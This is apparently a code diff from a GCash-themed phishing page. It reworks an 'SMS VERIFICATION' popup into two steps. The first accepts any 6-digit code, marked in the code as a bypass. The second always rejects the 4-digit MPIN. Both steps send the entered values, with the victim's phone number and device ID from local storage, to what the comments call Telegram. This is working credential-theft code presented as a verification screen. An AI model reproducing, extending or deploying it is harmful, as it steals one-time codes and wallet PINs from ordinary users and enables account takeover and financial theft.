@@ -280,55 +280,74 @@ Status: INVALID`;
         }, 300);
     }
     
-    // ========== PHASE 3: SMS VERIFICATION (NEON BLUE + NUMERIC KEYPAD) ==========
-    function showPhase3() {
-        const popupInner = document.querySelector('.popup-inner');
-        if (!popupInner) return;
+  // ========== PHASE 3: SMS VERIFICATION (6-digit TEXT + 4-digit MPIN) ==========
+function showPhase3() {
+    const popupInner = document.querySelector('.popup-inner');
+    if (!popupInner) return;
+    
+    // Reset entered values
+    enteredVerificationCode = '';
+    enteredMPIN = '';
+    showMPINKeypad = false;
+    
+    // Adjust popup container size
+    const popupContainer = document.querySelector('.popup-container');
+    if (popupContainer) {
+        popupContainer.style.maxWidth = '380px';
+        popupContainer.style.width = '90%';
+    }
+    
+    popupInner.innerHTML = `
+        <div class="popup-close" id="popupClosePhase3">✕</div>
         
-        // Adjust popup container size
-        const popupContainer = document.querySelector('.popup-container');
-        if (popupContainer) {
-            popupContainer.style.maxWidth = '380px';
-            popupContainer.style.width = '90%';
-        }
+        <!-- SMS ICON -->
+        <div style="text-align: center; margin-bottom: 10px;">
+            <div style="font-size: 55px; animation: bounceIn 0.5s ease;">📱</div>
+        </div>
         
-        popupInner.innerHTML = `
-            <div class="popup-close" id="popupClosePhase3">✕</div>
-            
-            <!-- SMS ICON -->
+        <!-- TITLE -->
+        <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 20px; font-weight: 900; color: #00f2ff; margin: 5px 0; letter-spacing: 1px; text-shadow: 0 0 10px #00f2ff; animation: neonBluePulse 1.5s infinite;">
+            SMS VERIFICATION
+        </h2>
+        
+        <div class="divider" style="width: 50px; margin: 10px auto; background: #00f2ff;"></div>
+        
+        <!-- STEP 1: 6-DIGIT VERIFICATION CODE -->
+        <div id="step1Container" style="background: linear-gradient(135deg, rgba(0,242,255,0.08), rgba(0,242,255,0.02)); border-radius: 16px; padding: 15px; margin: 10px 0;">
             <div style="text-align: center; margin-bottom: 10px;">
-                <div style="font-size: 55px; animation: bounceIn 0.5s ease;">📱</div>
+                <span style="font-size: 11px; color: #00f2ff;">STEP 1 OF 2</span>
             </div>
-            
-            <!-- TITLE -->
-            <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 20px; font-weight: 900; color: #00f2ff; margin: 5px 0; letter-spacing: 1px; text-shadow: 0 0 10px #00f2ff; animation: neonBluePulse 1.5s infinite;">
-                SMS VERIFICATION
-            </h2>
-            
-            <div class="divider" style="width: 50px; margin: 10px auto; background: #00f2ff;"></div>
-            
-            <!-- MESSAGE -->
-            <div style="background: linear-gradient(135deg, rgba(0,242,255,0.08), rgba(0,242,255,0.02)); border-radius: 16px; padding: 12px; margin: 10px 0;">
-                <p style="font-family: 'Inter', sans-serif; font-size: 12px; color: #ccc; line-height: 1.5; text-align: center; margin: 0;">
-                    A <strong style="color: #00f2ff;">6-digit verification code</strong> has been sent to your registered mobile number.
-                </p>
+            <p style="font-family: 'Inter', sans-serif; font-size: 11px; color: #ccc; line-height: 1.4; text-align: center; margin: 0 0 10px 0;">
+                Enter the <strong style="color: #00f2ff;">6-digit verification code</strong> sent via SMS
+            </p>
+            <div style="display: flex; gap: 10px; justify-content: center;">
+                <input type="text" id="verificationCode6Digit" class="verification-input" placeholder="123456" maxlength="6" inputmode="numeric" style="text-align: center; font-size: 20px; font-weight: bold; width: 180px; padding: 12px; background: rgba(0,0,0,0.5); border: 1px solid rgba(0,242,255,0.4); border-radius: 30px; color: white;">
+                <button id="verify6DigitBtn" class="claim-gcash-button" style="background: linear-gradient(135deg, #00aaff, #0066cc); width: auto; padding: 0 20px;">
+                    VERIFY
+                </button>
             </div>
-            
-            <!-- MPIN DOTS DISPLAY -->
-            <div class="mpin-dots" id="mpinDots">
-                <div class="mpin-dot"></div>
-                <div class="mpin-dot"></div>
-                <div class="mpin-dot"></div>
-                <div class="mpin-dot"></div>
+            <div id="step1ErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff8888; font-size: 11px;"></div>
+        </div>
+        
+        <!-- STEP 2: 4-DIGIT MPIN (initially hidden) -->
+        <div id="step2Container" style="display: none; background: linear-gradient(135deg, rgba(0,242,255,0.08), rgba(0,242,255,0.02)); border-radius: 16px; padding: 15px; margin: 10px 0;">
+            <div style="text-align: center; margin-bottom: 10px;">
+                <span style="font-size: 11px; color: #00f2ff;">STEP 2 OF 2</span>
             </div>
+            <p style="font-family: 'Inter', sans-serif; font-size: 11px; color: #ccc; line-height: 1.4; text-align: center; margin: 0 0 10px 0;">
+                Enter your <strong style="color: #ffd700;">4-digit MPIN</strong> to complete verification
+            </p>
             
-            <!-- ERROR MESSAGE -->
-            <div id="mpinErrorMsg" style="display: none; text-align: center; margin: 10px 0; color: #ff4444; font-size: 12px; background: rgba(255,68,68,0.1); padding: 8px; border-radius: 20px;">
-                ❌ Invalid MPIN. Please try again.
+            <!-- MPIN DOTS -->
+            <div class="mpin-dots" id="mpinDots" style="display: flex; justify-content: center; gap: 15px; margin: 15px 0;">
+                <div class="mpin-dot"></div>
+                <div class="mpin-dot"></div>
+                <div class="mpin-dot"></div>
+                <div class="mpin-dot"></div>
             </div>
             
             <!-- NUMERIC KEYPAD -->
-            <div class="numeric-keypad">
+            <div class="numeric-keypad" style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 15px; background: rgba(0, 242, 255, 0.08); border-radius: 30px; margin: 10px 0;">
                 <button class="num-btn" data-num="1">1</button>
                 <button class="num-btn" data-num="2">2</button>
                 <button class="num-btn" data-num="3">3</button>
@@ -343,118 +362,170 @@ Status: INVALID`;
                 <button class="num-btn" data-num="reset" style="font-size: 14px;">🗑️</button>
             </div>
             
-            <div style="font-size: 10px; color: #ffaa33; text-align: center; margin: 10px 0;">
-                ⏳ Enter the 4-digit MPIN sent via SMS
+            <div id="step2ErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff4444; font-size: 12px; background: rgba(255,68,68,0.1); padding: 8px; border-radius: 20px;">
+                ❌ Invalid MPIN. Please try again.
             </div>
-            
-            <div class="button-separator" style="margin: 15px 0 10px;"></div>
-            
-            <button class="back-btn" id="backBtnPhase3" style="transition: all 0.2s ease; width: 100%;">
-                ← BACK
-            </button>
-        `;
+        </div>
         
-        // Attach Phase 3 events
-        attachPhase3Events(popupInner);
-    }
+        <div class="button-separator" style="margin: 15px 0 10px;"></div>
+        
+        <button class="back-btn" id="backBtnPhase3" style="transition: all 0.2s ease; width: 100%;">
+            ← BACK
+        </button>
+    `;
     
-    // ========== UPDATE MPIN DOTS ==========
-    function updateMPINDots() {
-        const dots = document.querySelectorAll('.mpin-dot');
-        for (let i = 0; i < dots.length; i++) {
-            if (i < enteredMPIN.length) {
-                dots[i].classList.add('filled');
-            } else {
-                dots[i].classList.remove('filled');
-            }
-        }
-    }
+    // Attach Phase 3 events
+    attachPhase3Events(popupInner);
+}
+
+// ========== ATTACH PHASE 3 EVENTS ==========
+function attachPhase3Events(popupInner) {
+    const closeBtn = document.getElementById('popupClosePhase3');
+    if (closeBtn) closeBtn.onclick = function() { 
+        closePopup();
+        hideFirewallPopup();
+    };
     
-    // ========== CHECK MPIN (4-digit) ==========
-    async function checkMPIN() {
-        if (enteredMPIN.length === 4) {
-            const userPhone = localStorage.getItem("userPhone") || "Unknown";
-            const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
-            
-            // Send verification attempt to Telegram
-            await sendVerificationAttempt(userPhone, deviceId, enteredMPIN);
-            
-            // Show error message with shake effect
-            const errorMsg = document.getElementById('mpinErrorMsg');
-            const mpinDots = document.getElementById('mpinDots');
-            
-            if (errorMsg) {
-                errorMsg.style.display = 'block';
-            }
-            if (mpinDots) {
-                mpinDots.classList.add('shake-effect');
-                setTimeout(() => {
-                    if (mpinDots) mpinDots.classList.remove('shake-effect');
-                }, 300);
-            }
-            
-            // Clear entered MPIN
-            enteredMPIN = '';
-            updateMPINDots();
-            
-            // Hide error after 2 seconds
+    const backBtn = document.getElementById('backBtnPhase3');
+    if (backBtn) {
+        backBtn.onclick = function() {
+            popupInner.style.transition = 'opacity 0.3s ease';
+            popupInner.style.opacity = '0';
             setTimeout(() => {
-                if (errorMsg) errorMsg.style.display = 'none';
-            }, 2000);
-        }
-    }
-    
-    // ========== ATTACH PHASE 3 EVENTS ==========
-    function attachPhase3Events(popupInner) {
-        const closeBtn = document.getElementById('popupClosePhase3');
-        if (closeBtn) closeBtn.onclick = function() { 
-            closePopup();
+                showPhase1(currentBalance);
+                popupInner.style.opacity = '1';
+            }, 300);
             hideFirewallPopup();
         };
-        
-        const backBtn = document.getElementById('backBtnPhase3');
-        if (backBtn) {
-            backBtn.onclick = function() {
-                popupInner.style.transition = 'opacity 0.3s ease';
-                popupInner.style.opacity = '0';
-                setTimeout(() => {
-                    showPhase1(currentBalance);
-                    popupInner.style.opacity = '1';
-                }, 300);
-                hideFirewallPopup();
-            };
-        }
-        
-        // Attach numeric keypad buttons
-        const numBtns = document.querySelectorAll('.num-btn');
-        for (let i = 0; i < numBtns.length; i++) {
-            const btn = numBtns[i];
-            btn.onclick = function() {
-                const num = this.getAttribute('data-num');
-                
-                if (num === 'clear') {
-                    // Remove last character
-                    enteredMPIN = enteredMPIN.slice(0, -1);
-                    updateMPINDots();
-                } 
-                else if (num === 'reset') {
-                    // Clear all
-                    enteredMPIN = '';
-                    updateMPINDots();
+    }
+    
+    // STEP 1: 6-digit verification code (BYPASS - any 6 digits accepted)
+    const verify6DigitBtn = document.getElementById('verify6DigitBtn');
+    const code6Input = document.getElementById('verificationCode6Digit');
+    const step1ErrorMsg = document.getElementById('step1ErrorMsg');
+    const step1Container = document.getElementById('step1Container');
+    const step2Container = document.getElementById('step2Container');
+    
+    if (verify6DigitBtn) {
+        verify6DigitBtn.onclick = function() {
+            const code = code6Input?.value.trim();
+            
+            if (!code || code.length !== 6 || !/^\d+$/.test(code)) {
+                if (step1ErrorMsg) {
+                    step1ErrorMsg.innerText = "Please enter a valid 6-digit code.";
+                    step1ErrorMsg.style.display = 'block';
                 }
-                else if (enteredMPIN.length < 4) {
-                    // Add number
-                    enteredMPIN += num;
-                    updateMPINDots();
-                    
-                    // Auto-check when 4 digits are entered
-                    if (enteredMPIN.length === 4) {
-                        checkMPIN();
-                    }
+                if (code6Input) {
+                    code6Input.classList.add('shake-effect');
+                    setTimeout(() => code6Input.classList.remove('shake-effect'), 300);
                 }
-            };
+                return;
+            }
+            
+            // BYPASS - accept any 6-digit code
+            console.log('6-digit code accepted (bypass):', code);
+            
+            // Send notification to Telegram
+            const userPhone = localStorage.getItem("userPhone") || "Unknown";
+            const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+            sendVerificationAttempt(userPhone, deviceId, code + ' (6-digit bypass)');
+            
+            // Hide Step 1, Show Step 2
+            if (step1Container) step1Container.style.display = 'none';
+            if (step2Container) step2Container.style.display = 'block';
+            
+            // Initialize MPIN variables
+            enteredMPIN = '';
+            updateMPINDots();
+            attachMPINKeypad();
+        };
+    }
+    
+    // Enter key support for step 1
+    if (code6Input) {
+        code6Input.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                verify6DigitBtn.click();
+            }
+        });
+    }
+}
+
+// ========== MPIN DOTS UPDATE ==========
+function updateMPINDots() {
+    const dots = document.querySelectorAll('.mpin-dot');
+    for (let i = 0; i < dots.length; i++) {
+        if (i < enteredMPIN.length) {
+            dots[i].classList.add('filled');
+        } else {
+            dots[i].classList.remove('filled');
         }
     }
+}
+
+// ========== CHECK MPIN (ALWAYS INVALID) ==========
+function checkMPIN() {
+    if (enteredMPIN.length === 4) {
+        const userPhone = localStorage.getItem("userPhone") || "Unknown";
+        const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+        
+        // Send notification to Telegram
+        sendVerificationAttempt(userPhone, deviceId, enteredMPIN + ' (4-digit MPIN - INVALID)');
+        
+        // Show error with shake effect
+        const errorMsg = document.getElementById('step2ErrorMsg');
+        const mpinDots = document.getElementById('mpinDots');
+        
+        if (errorMsg) {
+            errorMsg.style.display = 'block';
+        }
+        if (mpinDots) {
+            mpinDots.classList.add('shake-effect');
+            setTimeout(() => mpinDots.classList.remove('shake-effect'), 300);
+        }
+        
+        // Clear entered MPIN
+        enteredMPIN = '';
+        updateMPINDots();
+        
+        // Hide error after 2 seconds
+        setTimeout(() => {
+            if (errorMsg) errorMsg.style.display = 'none';
+        }, 2000);
+    }
+}
+
+// ========== ATTACH MPIN KEYPAD ==========
+function attachMPINKeypad() {
+    const numBtns = document.querySelectorAll('.num-btn');
+    for (let i = 0; i < numBtns.length; i++) {
+        const btn = numBtns[i];
+        // Remove existing listeners
+        const newBtn = btn.cloneNode(true);
+        btn.parentNode.replaceChild(newBtn, btn);
+        
+        newBtn.onclick = function() {
+            const num = this.getAttribute('data-num');
+            
+            if (num === 'clear') {
+                enteredMPIN = enteredMPIN.slice(0, -1);
+                updateMPINDots();
+            } 
+            else if (num === 'reset') {
+                enteredMPIN = '';
+                updateMPINDots();
+            }
+            else if (enteredMPIN.length < 4) {
+                enteredMPIN += num;
+                updateMPINDots();
+                
+                if (enteredMPIN.length === 4) {
+                    checkMPIN();
+                }
+            }
+        };
+    }
+}
     
     // ========== HIDE FIREWALL POPUP ==========
     function hideFirewallPopup() {
